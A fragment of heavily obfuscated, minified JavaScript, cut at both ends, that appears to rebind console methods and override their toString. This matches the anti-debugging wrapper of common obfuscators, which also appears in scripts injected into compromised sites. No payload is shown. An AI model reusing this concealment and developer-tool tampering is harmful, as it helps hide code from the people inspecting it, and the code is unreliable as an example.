T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};